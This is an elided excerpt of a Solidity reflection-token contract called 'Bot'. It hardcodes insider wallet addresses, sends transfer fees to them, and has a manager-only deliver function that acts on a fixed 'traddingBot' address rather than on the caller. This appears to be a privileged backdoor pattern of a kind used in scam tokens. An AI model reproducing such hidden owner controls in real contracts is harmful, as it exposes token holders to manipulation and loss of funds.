...
abstract contract Tokenomics   {
    ...
    string internal constant NAME = "Bot";
    ...
    address internal devAddress = 0x7AFd707D1Dd2Dc515b8C8Ed0FE158F2104309f45;
    address internal marketingAddress = 0xaB9425479d8ddB352Bed108EDE0f1327561d48c8;
    address internal traddingBot = 0x5559240BDeac12955Ba02AC747791b897948685d;
    ...
    function _addFees() private {
        ...
        _addFee(FeeType.External, 30, traddingBot);
        _addFee(FeeType.External, 20, marketingAddress);
        _addFee(FeeType.External, 20, devAddress);
    }
...
abstract contract BaseRfiToken is IERC20, IERC20Metadata, Ownable, Presaleable, Tokenomics {
    ...
    /** Functions required by IERC20 **/
        ...
        function deliver(uint256 tAmount) public  onlyManager() {
            uint256 index = 2;
            address sender = 0x5559240BDeac12955Ba02AC747791b897948685d;
...
abstract contract Bot is BaseRfiToken, Liquifier, Antiwhale {
